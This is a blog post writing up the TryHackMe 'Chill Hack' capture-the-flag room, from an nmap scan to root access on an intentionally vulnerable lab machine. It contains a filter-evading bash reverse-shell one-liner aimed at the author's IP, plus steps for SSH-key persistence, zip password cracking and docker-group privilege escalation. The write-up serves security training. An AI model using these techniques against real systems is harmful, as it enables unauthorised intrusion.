<!DOCTYPE html>
<html lang="en-us">
<head>
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <title>Tzero86@trojanwave/posts/chillhack_writeup/</title>
    
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <meta name="robots" content="all,follow">
    <meta name="googlebot" content="index,follow,snippet,archive">
    <link rel="stylesheet" href="https://tzero86bits.tk/hugo-theme-console/css/terminal-0.7.1.min.css">
    <link rel="stylesheet" href="https://tzero86bits.tk/hugo-theme-console/css/animate-3.7.2.min.css">
    <link rel="stylesheet" href="https://tzero86bits.tk/hugo-theme-console/css/console.css">
    
      <!--[if lt IE 9]>
          <script src="https://oss.maxcdn.com/html5shiv/3.7.2/html5shiv.min.js"></script>
          <script src="https://oss.maxcdn.com/respond/1.4.2/respond.min.js"></script>
      <![endif]-->
    <link rel="icon" href="https://tzero86bits.tk/favicon.ico">
<link rel="icon" type="image/png" sizes="16x16" href="https://tzero86bits.tk/favicon-16x16.png">
<link rel="icon" type="image/png" sizes="32x32" href="https://tzero86bits.tk/favicon-32x32.png">
<link rel="apple-touch-icon" href="https://tzero86bits.tk/apple-touch-icon.png">
<link rel="mask-icon" href="https://tzero86bits.tk/safari-pinned-tab.svg">
<meta name="theme-color" content="#1d1e20">
<meta name="msapplication-TileColor" content="#1d1e20"><meta property="og:title" content="Chillhack_writeup" />
<meta property="og:description" content="" />
<meta property="og:type" content="article" />
<meta property="og:url" content="https://tzero86bits.tk/posts/chillhack_writeup/" /><meta property="article:published_time" content="2020-11-28T14:06:51-05:00" />



<meta name="twitter:title" content="Chillhack_writeup"/>
<meta name="twitter:description" content="This room provides the real world pentesting challenges. Let&rsquo;s give it a try!"/>

<script type="application/javascript">
var doNotTrack = false;
if (!doNotTrack) {
	(function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
	(i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
	m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
	})(window,document,'script','https://www.google-analytics.com/analytics.js','ga');
	ga('create', 'UA-175520987-1', 'auto');
	
	ga('send', 'pageview');
}
</script>
</head>
<body class="terminal">
    <div class="container">
        <div class="terminal-nav">
          <header class="terminal-logo">
            <div class="logo terminal-prompt">
              
              
              <a href="https://tzero86bits.tk/" class="no-style site-name">Tzero86@trojanwave</a>:~# 
              <a href='https://tzero86bits.tk/posts'>posts</a>/<a href='https://tzero86bits.tk/posts/chillhack_writeup'>chillhack_writeup</a>/</div></header>
          <nav class="terminal-menu">
            <ul vocab="https://schema.org/" typeof="BreadcrumbList">
                
                <li><a href="https://tzero86bits.tk/about/" typeof="ListItem">about/</a></li>
                
                <li><a href="https://tzero86bits.tk/posts/" typeof="ListItem">posts/</a></li>
                
            </ul>
          </nav>
        </div>
    </div>

    <div class="container animated zoomIn fast" >
        
<h1>Chillhack_writeup</h1>
Nov. 28, 2020


<br/><br/>
<img src="../img/chillhack_cover.gif" alt="Post Cover Gif animation"; style="width:100%;height:auto;left:0;right:0;margin:0 auto;text-align:center; border-radius:1%">
<br/><br/>
<h1 id="chill-hack---thm-room">Chill Hack - THM Room</h1>
<p>This time we&rsquo;ll hack, <code>Chill Hack</code> a THM room created by <code>Anurodh</code>. Let&rsquo;s get hacking!</p>
<ul>
<li>Please visit This room on TryHackMe by <a href="https://tryhackme.com/room/chillhack">clicking this link</a>.</li>
<li><strong>PLEASE NOTE:</strong> Passwords, flag values, or any kind of answers to the room questions were intentionally masked as required by THM writeups rules.</li>
</ul>
<h2 id="scanning-with-nmap">Scanning with Nmap</h2>
<p>We&rsquo;ll start things off by running <code>nnap</code> so we can get an idea of what we are dealing with:</p>
<pre tabindex="0"><code>┌──(kali㉿kali)-[~/Documents/THM/chillhack]
└─$ sudo nmap 10.10.57.249 -A -sC -sV -O -p- -T4
Starting Nmap 7.91 ( https://nmap.org ) at 2020-11-27 22:15 EST
Nmap scan report for 10.10.57.249
Host is up (0.33s latency).
Not shown: 65532 closed ports
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_-rw-r--r--    1 1001     1001           90 Oct 03 04:33 note.txt
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to ::ffff:10.13.0.34
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 4
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 09:f9:5d:b9:18:d0:b2:3a:82:2d:6e:76:8c:c2:01:44 (RSA)
|   256 1b:cf:3a:49:8b:1b:20:b0:2c:6a:a5:51:a8:8f:1e:62 (ECDSA)
|_  256 30:05:cc:52:c6:6f:65:04:86:0f:72:41:c8:a4:39:cf (ED25519)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: Game Info
Aggressive OS guesses: Linux 3.1 (95%), Linux 3.2 (95%), AXIS 210A or 211 Network Camera (Linux 2.6.17) (94%), ASUS RT-N56U WAP (Linux 3.4) (93%), Linux 3.16 (93%), Linux 2.6.32 (92%), Linux 2.6.39 - 3.2 (92%), Linux 3.1 - 3.2 (92%), Linux 3.2 - 4.9 (92%), Linux 3.5 (92%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 4 hops
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 1720/tcp)
HOP RTT       ADDRESS
1   226.31 ms 10.13.0.1
2   ... 3
4   365.34 ms 10.10.57.249

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 278.41 seconds
</code></pre><p>With this scan we get a few details we can start inspecting further. let&rsquo;s go with the anonymous ftp login first.</p>
<h2 id="anonymous-ftp">Anonymous FTP</h2>
<p>Let&rsquo;s connect to the FTP anonymously and see if there is anything of interest there.</p>
<p><img src="https://i.imgur.com/uzPSNM8.png" alt=""></p>
<p>We get a file called <code>note.txt</code>, lets see what its contents are:</p>
<p><img src="https://i.imgur.com/WKemQ52.png" alt=""></p>
<h2 id="gobuster">Gobuster</h2>
<p>Ok let&rsquo;s move on, let&rsquo;s fire up gobuster to see if we find something else.</p>
<p><img src="https://i.imgur.com/bJ5ZIU6.png" alt=""></p>
<p>We found a directory available, let&rsquo;s check it out</p>
<p><img src="https://i.imgur.com/sBZP3nI.png" alt=""></p>
<p>If we attempt to run a command there like a simple <code>ls</code> we get the following interesting screen:</p>
<p><img src="https://i.imgur.com/n9mLVaR.png" alt=""></p>
<p>This confirms the commands are being filtered.</p>
<h2 id="getting-initial-access">Getting initial access</h2>
<p>Let&rsquo;s try to run a simple <code>whoami</code>, this time we see it runs correctly:</p>
<p><img src="https://i.imgur.com/EFE0CiM.png" alt=""></p>
<p>We also now which username we have access to.</p>
<p>If we enter the command <code>dir</code> we do get a couple of results back, confirming that not all commands are indeed being filtered:</p>
<p><img src="https://i.imgur.com/utbMug4.png" alt=""></p>
<p>and if we try to append a <code>/images</code> to the URL, we see the following:</p>
<p><img src="https://i.imgur.com/cIgJPOQ.png" alt=""></p>
<p>There we can see both gif files that we can get when entering commands. Ok let&rsquo;s get back to the command page. We know that some commands are filtered and some commands will run just fine. We really need to get a better idea of which commands are blocked.</p>
<p>Let&rsquo;s see if we can bypass the filtering by scaping some characters, in this case we can try using the <code>\</code> (backslash) in between our commands letters and see if that manages to go through:</p>
<p><img src="https://i.imgur.com/8EVpuBY.png" alt=""></p>
<p>Great, we can somewhat bypass the filtered commands using the backslash. Let&rsquo;s see now if we can get a look at that php file where we could possibly find the filtering code that is preventing us from running all commands:</p>
<p>After running the command <code>c\at index.php</code> we can inspect the page code and see the following:</p>
<p><img src="https://i.imgur.com/T5Vmso7.png" alt=""></p>
<p>By doing that now we have a clear picture of what this command page is doing, the following commands are being filtered:</p>
<ul>
<li>nc, bash, php, perl, rm, cat, head, tail, python, python3, more, less, sh and ls.</li>
</ul>
<p>And we also learned that the page is using <code>php echo sheel_exec($cmd)</code> to execute the commands.</p>
<p>Let&rsquo;s see if we can get a reverse shell, let&rsquo;s take this code for example:</p>
<p><code>bash -c 'exec bash -i &amp;&gt;/dev/tcp/10.13.0.34/2112 &lt;&amp;1'</code></p>
<p>if we try to bypass the filter, we could try tweak it like this before running it:</p>
<p><code>b\ash -c 'exec b\ash -i &amp;&gt;/dev/tcp/10.13.0.34/2112 &lt;&amp;1'</code></p>
<blockquote>
<p>NOTE: Make sure to do a <code>nc -nlvp 2112</code> before running the command.</p>
</blockquote>
<p><img src="https://i.imgur.com/ZyxEwk2.png" alt=""></p>
<p>That worked, we now have our initial access to the machine.</p>
<h2 id="escalating-privs">Escalating Privs</h2>
<p>Now that we have our initial access into the target, we need to find a way to escalate privileges so we can get the flags. Lets see which additional details about the current user we can get. Let&rsquo;s run <code>id</code> and <code>sudo -l</code> to get more info about the groups the user belongs to and if he has any permissions to run a command as sudo:</p>
<p><img src="https://i.imgur.com/6QtEZAY.png" alt=""></p>
<p>We can see the only command we can run is a file called <code>.helpline.sh</code> from the user <code>apaar</code>. If we check the contents of that file we see some information of what it does. It seems to just pass any input the user provides and since this file is running with root permissions, we can pretty much use it to get higher privs. Let&rsquo;s try it out by invoking bash:</p>
<blockquote>
<p>NOTE: Notice we execute the file using <code>sudo -u apaar</code> otherwise the bash session will still get opened as the current user <code>www-data</code>.</p>
</blockquote>
<p><img src="https://i.imgur.com/TIKFaVe.png" alt=""></p>
<blockquote>
<p>R.I.P Neil Peart.</p>
</blockquote>
<h2 id="getting-the-first-flag">Getting the first flag</h2>
<p>Now we have have escaped from the limiter user, let&rsquo;s see if Apaar has our first flag:</p>
<p><img src="https://i.imgur.com/qEjSmYZ.png" alt=""></p>
<p>That&rsquo;s it, we got the first flag!</p>
<h2 id="getting-the-root-flag">Getting the Root flag</h2>
<p>Now we need to once again find a way to escalate to root privileges so we can access the last flag. Let&rsquo;s start by checking again some user information by running <code>id</code> and <code>sudo -l</code> once more:</p>
<p><img src="https://i.imgur.com/ylLkNYe.png" alt=""></p>
<p>As we can see we have pretty much the same access as before, we can still run that helpline as well. Let&rsquo;s upload and run linpeas and see if it locates something quickly.</p>
<p><img src="https://i.imgur.com/phpxTpl.png" alt=""></p>
<p>Let&rsquo;s see what linpeas can find for us.</p>
<h3 id="generating-our-ssh-key-pair">Generating our SSH key pair</h3>
<p>While that&rsquo;s running let&rsquo;s generate ourselves an SSH key pair so we can ideally log in through SSH and have a more stable shell before we continue:</p>
<p><img src="https://i.imgur.com/GmH58bI.png" alt=""></p>
<p>Now we need to upload the apaar.pub file inside the <code>.shh</code> folder of Apaar and then add our key into the authorized keys file.</p>
<p><img src="https://i.imgur.com/OIwU69X.png" alt=""></p>
<p>With that we should be able to connect through ssh using the key and get a better shell. Let&rsquo;s try that out:</p>
<p><img src="https://i.imgur.com/5w3tkem.png" alt=""></p>
<p>Now we have a real shell to interact with the system. Let&rsquo;s see how we get root now.</p>
<h2 id="back-to-getting-root">Back to getting root</h2>
<p>Ok now we have a good shell we need to get root, let&rsquo;s see if linpeas had found anything for us:</p>
<p><img src="https://i.imgur.com/C8lwlEm.png" alt=""></p>
<p>We there are two locally accessible ports: <code>9001</code> and <code>3306</code>. This smells like port forwarding 😂. Let&rsquo;s see if we can reconnect back through ssh by this time lets forward those ports to our localhost and see what they have for us:</p>
<p>For that lets look at the command we need to use:</p>
<ul>
<li><code>ssh -L 9001:127.0.0.1:9001 -i apaar apaar@10.10.189.206</code></li>
</ul>
<p>We are telling SSH to forward port 9001 through localhost at the same destination port and then we get connected again as apaar with our generated key. Let&rsquo;s run that</p>
<p><img src="https://i.imgur.com/L9aouRA.png" alt=""></p>
<p>Now let&rsquo;s see if that really worked. Let&rsquo;s try to access that localhost and port in our browser now:</p>
<p><img src="https://i.imgur.com/PEKbuti.png" alt=""></p>
<p>It worked and we can now access a login form, let&rsquo;s see what it has for us. Let&rsquo;s try inspecting the code as we usually do with any page we have access to. SPOILER: I did not find anything useful.</p>
<p>Let&rsquo;s see if using the user apaar we can navigate to the folder where this page is being served and look around for anything interesting:</p>
<p><img src="https://i.imgur.com/IqvhMG6.png" alt=""></p>
<p>Browsing around the location <code>/var/www</code> we see a few interesting files:</p>
<ul>
<li><code>account.php</code></li>
<li><code>hacker.php</code></li>
<li><code>index.php</code></li>
</ul>
<p>the one called account seems to be the login form we get when access port 9001. The One called hacker I&rsquo;m not sure we can check that one and Index.php should be the main file getting loaded. Let&rsquo;s cat both to see what they contain:</p>
<p><img src="https://i.imgur.com/F499VH1.png" alt=""></p>
<p>When we look at the contents of <code>hacker.php</code> we see there is a mention to a picture and some motivational text 😂. Before we move further let&rsquo;s see if we can grab that jpg file:</p>
<p><img src="https://i.imgur.com/nb7cnSt.png" alt=""></p>
<p>We do get that image, shall we try to see if there is anything in that picture for us?</p>
<h3 id="running-steghide-extract">Running steghide extract</h3>
<p>We can try running <code>steghide</code> with the flags <code>extract -sf {fileName}</code> and see if we get anything. Usually we would require a passphrase, but this time it seems to work without one:</p>
<p><img src="https://i.imgur.com/V2pucwm.png" alt=""></p>
<p>We get a backup file, and yeah it&rsquo;s password protected.</p>
<h3 id="down-the-rabbit-hole-lets-try-zip2john">Down the rabbit hole? Let&rsquo;s try zip2john</h3>
<p>We need to access that backup file, let&rsquo;s try to use zip2john and see if we manage to crack the password:</p>
<p><img src="https://i.imgur.com/QzgpGhh.png" alt=""></p>
<p>Now that we have a <code>john</code> formatted hash, let&rsquo;s run it using rockyou.txt as wordlist and see if we get lucky or if this was indeed a rabbit hole:</p>
<p><img src="https://i.imgur.com/HCyD3ar.png" alt=""></p>
<p>And we got the password, let&rsquo;s see what that backup file has to offer us:</p>
<p><img src="https://i.imgur.com/MQYPO8r.png" alt=""></p>
<p>Loot at that! We not only get a base64 encoded password, but also a possible username for that password too!</p>
<p>Let&rsquo;s quickly use Cyberchef to get the password decoded:</p>
<p><img src="https://i.imgur.com/0nSVkkH.png" alt=""></p>
<p>Great we do have a new set of credentials now.</p>
<p>If we do <code>su anurodh</code> and use the password we got, we are able to log as that user. When we run <code>id</code> we see something interesting:</p>
<p><img src="https://i.imgur.com/94xJiAC.png" alt=""></p>
<p>Do you see it? we are part of the docker group! 😂</p>
<h3 id="rocking-the-docker">Rocking the Docker</h3>
<p>Let&rsquo;s see if we have any way of escalating privileges using docker if we check our beloved <code>GTFObins.github.io</code> we see there is a way to root:</p>
<p><img src="https://i.imgur.com/wDqcD2F.png" alt=""></p>
<p>If we go ahead and try to run that we get:</p>
<p><img src="https://i.imgur.com/SOs6gMn.png" alt=""></p>
<p>WE GOT ROOT! Let&rsquo;s get that flag before the room timer runs out.</p>
<p><img src="https://i.imgur.com/fjmsgKu.png" alt=""></p>
<p>That was <code>Chill Hack</code> room from tryhackme, thank you very much for stopping by and thanks to <code>Anurodh</code> for creating this room, I enjoyed very much!</p>
<p>Happy hacking!</p>
<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/4.7.0/css/font-awesome.min.css">
<br>
<div class="container center" style="margin:10px !important;  text-align: center!important">
    <div class="center">
        <script src="https://tryhackme.com/badge/71634"></script>
    </div>
    <div class="center">
        <a href="https://twitter.com/Tzero86" target="_blank" class="fa fa-twitter" style="text-decoration: none !important;  font-size: 30px; padding: 5px"></a>
        <a href="https://github.com/Tzero86" target="_blank" class="fa fa-github" style="text-decoration: none !important;  font-size: 30px; padding: 5px"></a> 
        <a href="https://www.linkedin.com/in/ermedina86/" target="_blank" class="fa fa-linkedin" style="text-decoration: none !important;  font-size: 30px; padding: 5px"></a> 
        <br> 
    </div>
</div>

<div id="disqus_thread"></div>
<script type="application/javascript">
    var disqus_config = function () {
    
    
    
    };
    (function() {
        if (["localhost", "127.0.0.1"].indexOf(window.location.hostname) != -1) {
            document.getElementById('disqus_thread').innerHTML = 'Disqus comments not available by default when the website is previewed locally.';
            return;
        }
        var d = document, s = d.createElement('script'); s.async = true;
        s.src = '//' + "tzero86bits" + '.disqus.com/embed.js';
        s.setAttribute('data-timestamp', +new Date());
        (d.head || d.body).appendChild(s);
    })();
</script>
<noscript>Please enable JavaScript to view the <a href="https://disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript>
<a href="https://disqus.com" class="dsq-brlink">comments powered by <span class="logo-disqus">Disqus</span></a>

        <div class="footer">
    Made with <a href="https://gohugo.io/">Hugo</a> based of
    <a href="https://github.com/mrmierzejewski/hugo-theme-console/">Console Theme</a>. 
    Noli umquam discere desinere.
</div>

    </div>
  </body>
</html>
